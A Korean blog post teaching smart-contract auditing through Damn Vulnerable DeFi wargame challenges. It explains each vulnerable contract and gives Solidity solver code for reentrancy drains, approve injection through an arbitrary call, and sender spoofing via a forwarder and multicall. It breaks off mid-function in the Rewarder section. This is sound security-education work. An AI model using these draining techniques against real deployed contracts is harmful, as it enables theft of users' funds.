---
title: "[Research] smart contracts auditing 101 for pwners - PART 1 (KR)"
author: d4tura
tags: [d4tura, SmartContract, DeFi, Blockchain, Solidity]
categories: [Research]
date: 2025-09-07 17:00:00
cc: true
index_img: /2025/09/07/d4tura/smartcontracts/ko/smartcontracts.jpg
---

## Introduction
안녕하세요, 새롭게 hackyboiz에 합류한 d4tura 라고 합니다!

저는 [Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/) 라는 smart contracts 워게임을 풀어보며 해당 문제를 풀기 위해 필요한 개념들을 하나하나 살펴보고 이해하기 위해 이 연구글을 작성하고자 했습니다.

원래 Web3, smart contracts 분야보다는 기존의 kernel, hypervisor, client-server side protocol, mobile 등의 좀 더 전통적인(?) 타겟들을 대상으로 하는 제로데이 연구 및 익스플로잇 개발을 업무 및 개인 연구로써 몇년간 해왔고, 지금도 본업은 그쪽입니다 ㅎㅎ.

하지만 평소 접해보지 않은 새로운 분야를 연구하고, 다른 분들과 의견을 나누는 과정에서 분명 서로 배우는 점이 많다고 믿습니다. 그런 생각으로 **hackyboiz** 팀에 합류하게 되었고, 경험이 없던 smart contracts auditing을 주제로 글을 쓰게 되었습니다.

이 글은 저처럼 시스템 해킹을 주로 다뤄오신 분들이 블록체인에 대한 기초 지식만으로 smart contracts auditing을 시작할 때 참고할 수 있도록 작성했습니다. 따라서 특정 챌린지의 풀이법 자체에 집중하기보다는, **문제를 해결하는 데 필요한 핵심 개념을 'pwner의 관점'에서 최대한 쉽게 풀어쓰려고 노력했습니다.**

또한, 대부분의 챌린지가 Solidity 언어로 작성되었지만, 특정 버그 패턴보다는 각 문제에 담긴 개념 학습에 초점을 맞추기 위해 Solidity 언어 자체에 대한 깊은 설명은 생략했습니다.

마지막으로, 개념 설명 중 부수적이거나 글의 흐름을 방해할 수 있는 용어들은 상세 설명을 덧붙이는 대신, 이를 잘 정리해놓은 다른 문서나 코드를 **하이퍼링크**로 연결해 두었으니 참고 부탁드립니다.

![](/2025/09/07/d4tura/smartcontracts/ko/image1.png)

## Damn Vulnerable DeFi 소개

**Damn Vulnerable DeFi** 워게임은 본래 [OpenZeppelin](https://github.com/OpenZeppelin/damn-vulnerable-defi) 그룹이 관리하던 것을 The Red Guild가 이어받아, 현재 [v4.1.0](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.1.0) 버전까지 유지보수하고 있습니다.

모든 문제 환경은 `damn-vulnerable-defi/test/[challenge 이름]/[challenge 이름].t.sol` 경로에 정의되어 있습니다. 예를 들어, `Unstoppable` 챌린지는 [test/unstoppable/Unstoppable.t.sol](https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/unstoppable/Unstoppable.t.sol) 파일에서 환경 설정을 확인할 수 있습니다.

![](/2025/09/07/d4tura/smartcontracts/ko/image2.png)

각 문제 환경은 단일 contract 안에서 다음과 같은 함수와 인자들로 구성됩니다.

- `deployer`
    - 각각의 smart contract를 배포하는 주체, 벤더사 역할을 한다고 볼 수 있음
- `player`
    - challenge를 푸는 player
- `setUp()`
    - challenge 환경을 세팅하는 함수, 해당 함수에서 환경을 어떻게 세팅하는지 확인 후 분석을 시작하면 됨.
- `test_assertInitialState()`
    - `setUp()` 함수에서 초기 세팅이 잘되었는지 확인하는 함수
- `test_challenge 이름()`
    - challenge 분석 후 문제 풀이를 정의해야 하는 함수, **`player` 는 이 함수만을 수정해야만 함**
- `_isSolved()`
    - challenge의 해결 여부를 판단하는 함수, 이 함수가 실행 후 문제 없이 종료되면 문제가 해결되었다고 판단

각 챌린지의 대상이 되는 smart contract 코드는 대부분 `damn-vulnerable-defi/src/[challenge 이름]/` 경로에 있으며, `setUp()` 함수에서 해당 contract의 instance를 생성하며 초기 환경을 설정합니다. 워게임의 목표는 이 contract 코드의 취약점을 분석하고, `test_challenge 이름()` 함수를 수정하여 `_isSolved()` 함수를 통과하는 것입니다.

**contract**란 개념이 처음엔 많이 낮설게 느껴질 수 있지만, 개인적으로는 C++나 다른 객체 지향 언어의 **클래스(class)와 아주 유사하다**고 생각합니다.

![](/2025/09/07/d4tura/smartcontracts/ko/image3.png)

곧이어 다룰 첫 번째 문제 `Unstoppable`의 [UnstoppableVault](https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/unstoppable/UnstoppableVault.sol#L16) contract를 예로 들어보겠습니다. `IERC3156FlashLender, ReentrancyGuard, Owned, ERC4626, Pausable` 등 이미 구현된 다른 contract의 기능을 가져다 쓰는 것은 마치 부모 클래스를 상속받는 것과 같습니다. 또한, 멤버 변수와 함수에 `public` 키워드가 붙어야만 외부에서 접근할 수 있다는 점, 그리고 `this` 키워드를 현재 instance에 접근하기 위해 사용하는 점도 클래스의 개념과 사실상 동일합니다.

```solidity
/**
 * An ERC4626-compliant tokenized vault offering flashloans for a fee.
 * An owner can pause the contract and execute arbitrary changes.
 */
contract UnstoppableVault is IERC3156FlashLender, ReentrancyGuard, Owned, ERC4626, Pausable {

		// == member variable
    uint256 public constant FEE_FACTOR = 0.05 ether;
    uint64 public constant GRACE_PERIOD = 30 days;

    uint64 public immutable end = uint64(block.timestamp) + GRACE_PERIOD;

    address public feeRecipient;

		// == member function
    constructor(ERC20 _token, address _owner, address _feeRecipient)
        ERC4626(_token, "Too Damn Valuable Token", "tDVT")
        Owned(_owner)
    {
        feeRecipient = _feeRecipient;
        emit FeeRecipientUpdated(_feeRecipient);
    }

    /**
     * @inheritdoc IERC3156FlashLender
     */
    function maxFlashLoan(address _token) public view nonReadReentrant returns (uint256) {
        if (address(asset) != _token) {
            return 0;
        }

        return totalAssets();
    }

```

마지막으로, 대부분의 챌린지는 [DamnValuableToken](https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/DamnValuableToken.sol)이라는 [ERC20](https://eips.ethereum.org/EIPS/eip-20) 기반 토큰을 다룹니다. ERC20 토큰에서 자주 사용되는 아래 함수들은 미리 알아두시면 좋습니다.

- [totalSupply()](https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#ERC20-totalSupply--)
    - 현재 해당 token instance에서 생성 총 자산의 양을 반환
- [balanceOf(address account)](https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#IERC20-balanceOf-address-)
    - `account`가 보유중인 해당 token의 총량을 반환
- [transfer(address to, address value)](https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#IERC20-balanceOf-address-)
    - `value` 만큼의 해당 token을 caller account에서 인출해 `to` 에게 보냄
- [transferFrom(address from, address to, uint256 value)](https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#IERC20-transferFrom-address-address-uint256-)
    - `value` 만큼의 해당 token을 `from` account에서 인출해 `to` 에게 보냄
- [approve(address spender, uint256 value)](https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#IERC20-approve-address-uint256-)
    - `spender` 가 caller account에서 `value` 만큼 인출할 수 있게 됨

( Just fyi, [ERC](https://eips.ethereum.org/erc)란 **E**thereum **R**equest for **C**omment의 약자로, 기존의 프로그래밍에서 사용하는 [RFC](https://en.wikipedia.org/wiki/Request_for_Comments) 문서 처럼 특정 기술을 구현할 때 필요한 개념 명세의 smart contract 버전 )

## 1. Unstoppable: total balance != total supply

### Challenge Explanation

`Unstoppable` 문제의 경우,  [UnstoppableVault.flashLoan()](https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/unstoppable/UnstoppableVault.sol#L78) 함수에서 `revert` 구문을 실행시키는게 목적이며, 총 4개의 `revert` 구문이 존재합니다.

```solidity
    function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
        external
~~~~        returns (bool)
    {
        if (amount == 0) revert InvalidAmount(0); // fail early
        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
        uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement

        // transfer tokens out + execute callback on receiver
        ERC20(_token).safeTransfer(address(receiver), amount);

        // callback must return magic value, otherwise assume it failed
        uint256 fee = flashFee(_token, amount);
        if (
            receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)
                != keccak256("IERC3156FlashBorrower.onFlashLoan")
        ) {
            revert CallbackFailed();
        }
        // ....
```

`revert InvalidAmount(0)` , `revert UnsupportedCurrency()` , `revert CallbackFailed()` 구문은 플레이어가 특정 값을 조작해 실행시킬 수 있는 부분이 아니라, 기본적인 무결성 검사(sanity check)에 가깝습니다. 따라서 저희의 목표는 `revert InvalidBalance()` 구문을 실행시키는 것입니다.

```solidity
// UnstoppableVault.totalAssets
function totalAssets() public view override nonReadReentrant returns (uint256) {
    return asset.balanceOf(address(this));
}

// ERC4626.convertToShares
function convertToShares(uint256 assets) public view virtual returns (uint256) {
    uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.
    return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
}
```

`totalAssets()` 함수는 현재 `UnstoppableVault` contract가 보유한 자산(balance)의 총량을 반환합니다. `convertToShares()` 함수는 사칙연산이 포함되어 조금 복잡해 보이지만, 실제로는 아래와 같이 해석할 수 있습니다.

```solidity
convertToShares(totalSupply) 
= (totalSupply * totalSupply) / totalAssets()
```

여기서 `totalSupply`는 해당 ERC20 토큰이 발행한 총자산을 의미하며, 토큰을 주조([mint](https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#ERC4626-mint-uint256-address-))하면 증가하고 소각([burn](https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#ERC20-_burn-address-uint256-))하면 감소합니다.

```solidity
	  // ERC20._mint
    function _mint(address to, uint256 amount) internal virtual {
        totalSupply += amount;
        
.....
		// ERC20._burn
    function _burn(address from, uint256 amount) internal virtual {
        // ....
        unchecked {
            totalSupply -= amount;
        }
```

문제의 초기 설정(`setUp()` 함수)을 보면, `TOKEN_IN_VAULT` 만큼의 금액을 `vault`에 예금(deposit)합니다. 이 과정에서 `vault`에 예치된 금액(`totalAssets`)과 토큰이 발행한 총량(`totalSupply`)은 `TOKEN_IN_VAULT` 값으로 동일해집니다.

```solidity
    // UnstoppableChallenge.setUp
        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, address(deployer));
        
// ....

    // ERC4626._deposit
    function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal virtual {
        // If _asset is ERC-777, `transferFrom` can trigger a reentrancy BEFORE the transfer happens through the
        // `tokensToSend` hook. On the other hand, the `tokenReceived` hook, that is triggered after the transfer,
        // calls the vault, which is assumed not malicious.
        //
        // Conclusion: we need to do the transfer before we mint so that any reentrancy would happen before the
        // assets are transferred and before the shares are minted, which is a valid state.
        // slither-disable-next-line reentrancy-no-eth
        SafeERC20.safeTransferFrom(_asset, caller, address(this), assets);
        _mint(receiver, shares);

        emit Deposit(caller, receiver, assets, shares);
    }
```

### Challenge Solving

초기엔 `totalSupply` ( = `token` 이 주조( mint )한 금액 )와 `totalAssets()`( = `vault` 에 예치된 금액 )이 둘다 `TOKEN_IN_VAULT` 로 동일하기 때문에 `convertToShares(totalSupply)` 는 `TOKEN_IN_VAULT` 를 반환하고, `totalAssets()` 도 `TOKEN_IN_VAULT` 를 반환하기 때문에 동일합니다.

하지만 이 조건이 언제나 참이라고 보장할 수 없습니다. 만약 누군가 `vault` 주소로 토큰을 직접 전송(transfer)한다면 어떻게 될까요? `vault`가 보유한 실제 자산(`totalAssets`)은 늘어나지만, 토큰의 총 발행량(`totalSupply`)은 변하지 않습니다. 이 두 값의 불일치로 인해 `convertToShares(totalSupply) != balanceBefore` 조건이 성립하게 됩니다.

따라서, `vault` contract 주소로 아주 적은 양의 토큰을 보내기만 하면 문제를 해결할 수 있습니다.

```solidity
function test_unstoppable() public checkSolvedByPlayer {
    token.transfer(address(vault), 1);
}
```

## 2. Naive Receiver: flash loan with fixed fee

### Challenge Explanation

이번 challenge의 목표는 최대 2번의 transaction 호출만으로 `receiver` 와 `pool` 의 자산을 모두 탈취해 `recovery` 에게 송금하는게 목표입니다. 

**(** Just fyi, **transaction** 이란 용어는 현재 문맥상 ****다른 contract에 정의되어 함수를 호출하는걸 의미 )

```solidity
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
```

[pool.flashLoan()](https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/naive-receiver/NaiveReceiverPool.sol#L43) 함수는 이름 그대로 `receiver` 에게 무담보 대출( flash loan ) 서비스를 제공해주고, 수수료로 `FIXED_FEE`(`1 ether`)만큼의 고정된 금액을 받습니다.

( Just fyi, `1e18` = `1 ether` )

```solidity
function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
    external
    returns (bool)
{
    if (token != address(weth)) revert UnsupportedCurrency();

    // Transfer WETH and handle control to receiver
    weth.transfer(address(receiver), amount);
    totalDeposits -= amount;

    if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
        revert CallbackFailed();
    }

    uint256 amountWithFee = amount + FIXED_FEE;
    weth.transferFrom(address(receiver), address(this), amountWithFee);
    totalDeposits += amountWithFee;

    deposits[feeReceiver] += FIXED_FEE;

    return true;
}
```

### Challenge Solving

핵심은 `FIXED_FEE`를 이용해 `flashLoan` 함수를 반복적으로 호출하면, `receiver`의 모든 자산을 `pool`로 옮길 수 있다는 점입니다. `receiver`의 자산이 고갈될 때까지 이 과정을 반복하면 됩니다.

그 후, [pool.withdraw()](https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/naive-receiver/NaiveReceiverPool.sol#L66) 함수를 살펴보면 자산을 인출할 때 **아무런 권한 검사를 하지 않습니다.** 따라서 `pool`에 쌓인 모든 자산을 우리가 원하는 주소로 손쉽게 빼낼 수 있습니다.

```solidity
function withdraw(uint256 amount, address payable receiver) external {
    // Reduce deposits
    deposits[_msgSender()] -= amount;
    totalDeposits -= amount;

    // Transfer ETH to designated receiver
    weth.transfer(receiver, amount);
}
```

이 challenge는 최대 2번의 transaction만으로 해결해야 합니다. 이를 위해 [MultiCall.multicall()](https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/naive-receiver/Multicall.sol#L9) 함수를 사용하면, 여러 함수 호출을 하나의 transaction으로 묶어 처리할 수 있습니다.

```solidity
function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
        results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
    return results;
}
```

풀이의 마지막 단계에서는 [BasicForwarder.execute()](https://github.com/theredguild/damn-vulnerable-defi/blob/98028bbbc32c189b99241ba993d69d3517837e29/src/naive-receiver/BasicForwarder.sol#L55) 함수를 사용합니다. `BasicForwarder` contract는  [meta transaction](https://www.alchemy.com/overviews/meta-transactions)을 지원하는데, 이는 사용자를 대신해 transaction 수수료(gas fee)를 지불해주는 기능입니다.

![](/2025/09/07/d4tura/smartcontracts/ko/image4.png)

이 문제에서는 `withdraw` 함수 호출 시 `_msgSender()`가 `deployer`의 주소를 반환하도록 만들어야 `pool`의 자산을 모두 인출할 수 있는데, `BasicForwarder`를 사용하면 이 조건을 만족시킬 수 있습니다.

( Just fyi, **gas fee**란  smart contract의 함수를 호출하는 등 실제 main-net상에서 동작중인 blockchain에 transaction을 기록할 때마다 지불해야하는 수수료를 의미 )

```solidity
// NaiveReceiverPool.sol
function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder && msg.data.length >= 20) {
        return address(bytes20(msg.data[msg.data.length - 20:]));
    } else {
        return super._msgSender();
    }
}

// BasicForwarder.sol
function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
    _checkRequest(request, signature);

    nonces[request.from]++;

    uint256 gasLeft;
    uint256 value = request.value; // in wei
    address target = request.target;
    bytes memory payload = abi.encodePacked(request.data, request.from);
    uint256 forwardGas = request.gas;
    assembly {
        success := call(forwardGas, target, value, add(payload, 0x20), mload(payload), 0, 0) // don't copy returndata
        gasLeft := gas()
    }

    if (gasLeft < request.gas / 63) {
        assembly {
            invalid()
        }
    }
}
```

최종 공격 흐름은 다음과 같습니다.

1.  `multicall` 함수를 이용해 `flashLoan` 함수를 10번 호출하여 `receiver`의 자산을 `pool`로 모두 옮기고, 이어서 `withdraw` 함수를 호출해 `pool`의 모든 자금을 `recovery` 계정으로 인출
2. 이 모든 과정을 `BasicForwarder`를 통해 실행하여 단일 transaction으로 처리

```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    bytes[] memory call_datas = new bytes[](11);
    // WETH_IN_RECEIVER = 10e18
    // FIXED_FEE = 1e8
    // calling flashLoan 10 times
    for(uint i = 0; i < 10; i++) {
        call_datas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 9e18, ""));
    }

		// deposits[deployer] -= WETH_IN_POOL + WETH_IN_RECEIVER;
		// weth.transfer(recovery, WETH_IN_POOL + WETH_IN_RECEIVER);
    call_datas[10] = abi.encodePacked(
        abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
        bytes20(uint160(deployer))
    );

    bytes memory call_data = abi.encodeCall(Multicall.multicall, call_datas);

    BasicForwarder.Request memory request = BasicForwarder.Request({
        from: player,
        target: address(pool),
        value: 0,
        gas: gasleft(),
        nonce: forwarder.nonces(player),
        data: call_data,
        deadline: block.timestamp + 1 days
    });

    // creating hash for request
    bytes32 request_hash = keccak256(
        abi.encodePacked(
            "\x19\x01", // == EIP-712 signature, because BasicForwarder is EIP712
            forwarder.domainSeparator(),
            forwarder.getDataHash(request)
        )
    );

    // r = 1st part of signature
    // s = 2nd part of signature
    // v = recovery ID
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, request_hash);
    bytes memory signature = abi.encodePacked(r,s,v);

    forwarder.execute(request, signature);
}
```

## 3. Truster: don’t trust borrower too much

### Challenge Explanation

[TrusterLenderPool.sol](https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/truster/TrusterLenderPool.sol) contract의 `flashLoan` 함수는 `borrower`에게 무담보 대출을 제공합니다. 특이한 점은, 대출받은 금액을 사용하는 로직을 `data` 인자로 전달받아 [call](https://rareskills.io/post/low-level-call-solidity) 을 통해 직접 호출한다는 것입니다.

함수 실행이 끝난 후, `pool`의 잔고(`token.balanceOf(address(this))`)가 대출 이전(`balanceBefore`)보다 적으면 `revert`가 발생합니다. 즉, 대출 금액이 0이거나, `data`로 전달된 함수 내에서 빌린 금액을 다시 상환해야 합니다.

```solidity
// TrusterLenderPool.flashLoan
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    target.functionCall(data);

    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```

### Challenge solving

문제는 `data` 인자를 통해 어떤 함수든 호출할 수 있다는 점입니다. 만약 [ERC20.approve()](https://github.com/transmissions11/solmate/blob/34d20fc027fe8d50da71428687024a29dc01748b/src/tokens/ERC20.sol#L68) 함수를 호출하면 어떻게 될까요?

`approve` 함수는 특정 계정(`spender`)이 함수 호출자(`msg.sender`)의 계좌에서 토큰을 인출할 수 있는 한도([allowance](https://metaschool.so/articles/what-are-erc20-approve-erc20-allowance-methods))를 설정하며, 이 작업은 `pool`의 실제 잔고에 아무런 영향을 주지 않습니다.

```solidity
// ERC20.approve
function approve(address spender, uint256 amount) public virtual returns (bool) {
    allowance[msg.sender][spender] = amount;

    emit Approval(msg.sender, spender, amount);

    return true;
}
```

`allowance` 값의 증가는 현재 `pool` 의 잔고 금액에 영향 없이 인출 가능 금액의 허용 범위만 증가하기 때문에 

- `flashLoan()` 함수 호출 시 대출받을 금액인  `amount` 인자 값을 0으로 설정
- `ERC20.approve()` 함수 호출
- `if (token.balanceOf(address(this)) < balanceBefore)` 구문을 통과 후 `flashLoan()` 함수 정상 종료

과정을 거쳐서 `pool` 의 총 자산을 탈취할 수 만큼의 `allowance` 값이 설정되게 됩니다.

따라서 다음과 같은 실행 흐름이 가능합니다.

1. `flashLoan()` 함수를 호출하되, 대출 금액(`amount`)은 0으로 설정
2. `data` 인자로는 `ERC20.approve()` 함수 호출 데이터를 넘겨, 공격자 contract가 `pool`의 모든 자산을 인출할 수 있도록 `allowance`를 설정
3. `flashLoan()` 함수는 `pool`의 잔고 변화가 없으므로 정상적으로 종료
4. 공격자는 `approve`를 통해 얻은 권한으로 `transferFrom` 함수를 호출하여 `pool`의 모든 자금을 탈취

```solidity
function test_truster() public checkSolvedByPlayer {
    new TrusterSolver(pool, recovery, token);
}

// ....

contract TrusterSolver {
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;
    constructor(TrusterLenderPool pool, address recovery, DamnValuableToken token) {
        // ERC20.approve(address(this), TOKENS_IN_POOL);
        // address(this) <- TrusterSolver contract
        bytes memory approve_call = abi.encodeCall(ERC20.approve, (address(this), TOKENS_IN_POOL));

        // amount = 0
        // borrower = address(this) = TrusterSolver contract
        // target = token
        // target.functionCall = token.functionCall(approve_call);
        pool.flashLoan(0, address(this), address(token), approve_call);

        // pool -> recovery to TOKENS_IN_POOL DVT
        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
    }
}

```

## 4. Side Entrance: re-enter the contract

### Challenge Explanation

[SideEntranceLenderPool.flashLoan()](https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/side-entrance/SideEntranceLenderPool.sol#L35) 함수는 호출자(`msg.sender`)가 원하는 만큼의 ETH를 무담보로 대출해주고, `msg.sender` contract에 정의된 `execute` 함수를 호출해 줍니다. 이때 대출받은 금액(`amount`)을 `msg.value`로 함께 전달합니다.

```solidity
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    if (address(this).balance < balanceBefore) {
        revert RepayFailed();
    }
}
```

`execute` 함수는 [payable](https://docs.soliditylang.org/en/latest/contracts.html#receive-ether-function) 옵션을 가지고 있는데, 이는 함수가 호출될 때 ETH를 받을 수 있다는 의미입니다. `{value: amount}` 구문을 통해 호출자는 피호출자에게 `amount` 만큼의 ETH를 송금하게 됩니다.

```solidity
interface IFlashLoanEtherReceiver {
    function execute() external payable;
}
```

`SideEntranceLenderPool` contract는 예금(`deposit`) 및 출금(`withdraw`) 기능도 제공하며, 각 사용자의 예치금을 `balances` 객체에 기록합니다.

예를 들어, `withdraw()` 함수를 호출하면 `balances` 에 보관된 만큼의 금액을 [SafeTransferLib.safeTransferETH()](https://github.com/transmissions11/solmate/blob/50e15bb566f98b7174da9b0066126a4c3e75e0fd/src/utils/SafeTransferLib.sol#L15) 함수를 통해 호출자( =`msg.sender` ) 에게 송금해 줍니다.

```solidity
contract SideEntranceLenderPool {
    mapping(address => uint256) public balances;
    // ....
    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }
```

### Challenge Solving

이 contract의 가장 큰 문제는 [**재진입(Re-entrancy)](https://github.com/kadenzipfel/smart-contract-vulnerabilities/blob/master/vulnerabilities/reentrancy.md) 공격**에 취약하다는 점입니다.  [ReentrancyGuard](https://medium.com/@mayankchhipa007/openzeppelin-reentrancy-guard-a-quickstart-guide-7f5e41ee388f)와 같은 방어 메커니즘이 구현되어 있지 않습니다.

아래 그림과 같이 contract A가 contract B의 함수(`flashLoan`)를 호출했을 때, 그 함수 실행이 끝나기 전에 contract B가 다시 contract A의 함수(`execute`)를 호출하고, 이 함수 안에서 다시 contract B의 다른 함수를 호출하거나 객체에 접근해 상태를 조작하는 공격 기법입니다.

![](/2025/09/07/d4tura/smartcontracts/ko/image5.png)

개인적으로 전 이 re-entrancy 취약점 유형이 browser JS engine의 side-effect 취약점 유형과 흡사하다고 생각했습니다.

- JS engine side-effect 취약점 예시:
    - https://github.com/saelo/cve-2018-4233/blob/master/pwn.js#L27-L32
    - https://www.enki.co.kr/en/media-center/tech-blog/clobber-the-world-endless-side-effect-issue-in-safari
    - https://github.blog/security/vulnerability-research/getting-rce-in-chrome-with-incorrect-side-effect-in-the-jit-compiler/#exploiting-the-bug

re-entrancy 취약점은 browser JS engine의 side-effect 취약점처럼 smart contract의 가장 대표적인 취약점 유형이기 때문에 제대로 이해하셔야 합니다.

![](/2025/09/07/d4tura/smartcontracts/ko/image6.png)

공격 시나리오는 다음과 같습니다.

1. 공격자 contract에서 `pool`의 `flashLoan()` 함수를 호출하여 모든 ETH(`ETHER_IN_POOL`)를 대출받음
2. `pool`은 대출금을 전달하며 공격자 contract의 `execute()` 함수를 호출
3. `execute()` 함수 내부에서, 대출받은 모든 ETH를 다시 `pool`의 `deposit()` 함수를 통해 예금. 이 과정에서 `balances[공격자 contract 주소]`에 대출금액이 기록됨
4. `execute()` 함수가 종료되면 `flashLoan()` 함수로 제어권이 돌아옵니다. `pool`의 잔고는 대출 이전과 동일하므로, `RepayFailed()` 구문을 실행하지 않고 함수가 정상적으로 종료됨
5. 공격자 contract에서 `pool`의 `withdraw()` 함수를 호출하여 `balances`에 기록된 금액을 합법적으로 인출하여 자금을 탈취한 뒤 `recovery` 로 송금

```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    SideEntranceSolver solver = new SideEntranceSolver(pool, recovery);
    solver.solve();
}

// ....

contract SideEntranceSolver is IFlashLoanEtherReceiver {
    uint256 constant ETHER_IN_POOL = 1000e18;

    SideEntranceLenderPool _pool;
    address _recovery;

    constructor(SideEntranceLenderPool pool, address recovery) {
        _pool = pool;
        _recovery = recovery;
    }

    function solve() public {
        _pool.flashLoan(ETHER_IN_POOL);
        _pool.withdraw();
        payable(_recovery).transfer(ETHER_IN_POOL);
    }

    function execute() external payable override {
		    // send ETHER_IN_POOL to _pool
        _pool.deposit{value: ETHER_IN_POOL}();
    }
    
    // receive() required if payable function exists on contract
    receive() external payable {}
}
```

## 5. The Rewarder: claim your reward(s)

### Challenge Explanation

이번엔 무담보대출 서비스는 없고 대신 특정 주소 목록을 대상으로 `DamnValuableToken`과 `WETH` 토큰을 리워드로 지급하는 기능이 있습니다.

reward 대상이 되는 주소와 reward 금액의 경우, `DamnValuableToken` 지급 대상은 [dvt-distribution.json](https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/the-rewarder/dvt-distribution.json), `WETH` 지급 대상은 [weth-distribution.json](https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/the-rewarder/weth-distribution.json) 에 정의되어 있습니다.

```json
// dvt-distribution.json
[
    {
        "address": "0x230abc2a7763e0169b38fbc7d48a5aa7b6245011",
        "amount": 4665241241345036
    },
    {
        "address": "0x81e46e5cbe296dfc5e9b2df97ec8f24a9a65bec2",
        "amount": 9214418266997362
    },
    {
        "address": "0x328809Bc894f92807417D2dAD6b7C998c1aFdac6",
        "amount": 2502024387994809
    },
    ...

// weth-distribution.json
[
    {
        "address": "0x230abc2a7763e0169b38fbc7d48a5aa7b6245011",
        "amount": 3726409081682308
    },
    {
        "address": "0x81e46e5cbe296dfc5e9b2df97ec8f24a9a65bec2",
        "amount": 870420547863448
    },
    {
        "address": "0x328809Bc894f92807417D2dAD6b7C998c1aFdac6",
        "amount": 228382988128225
    },
    ...
```

[TheRewardDistributor.claimRewards()](https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/the-rewarder/TheRewarderDistributor.sol#L81) 함수를 보시면, 다수의 reward 청구 요청을 한번에 받아 처리할 수 있게 루틴이 구현되어 있는데 이런 식으로 다수의 요청을 받아 단일 transaction으로 처리하는 구조는 많은 smart contract 구현체에서 **gas fee를 절약**하기 위해 채택하는 구조입니다.

참고로 이 함수안에 취약점이 있는데, 어딘지 아시겠나요😊?

```solidity
struct Distribution {
    uint256 remaining;
    uint256 nextBatchNumber;
    mapping(uint256 batchNumber => bytes32 root) roots;
    mapping(address claimer => mapping(uint256 word => uint256 bits)) claims;
}

// ....

// Allow claiming rewards of multiple tokens in a single transaction
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    Claim memory inputClaim;
    IERC20 token;
    uint256 bitsSet; // accumulator
    uint256 amount;

    for (uint256 i = 0; i < inputClaims.length; i++) {
        inputClaim = inputClaims[i];

        uint256 wordPosition = inputClaim.batchNumber / 256;
        uint256 bitPosition = inputClaim.batchNumber % 256;

        if (token != inputTokens[inputClaim.tokenIndex]) {
            if (address(token) != address(0)) {
                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
            }

            token = inputTokens[inputClaim.tokenIndex];
            bitsSet = 1 << bitPosition; // set bit at given position
            amount = inputClaim.amount;
        } else {
            bitsSet = bitsSet | 1 << bitPosition;
            amount += inputClaim.amount;
        }

        // for the last claim
        if (i == inputClaims.length - 1) {
            if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
        }

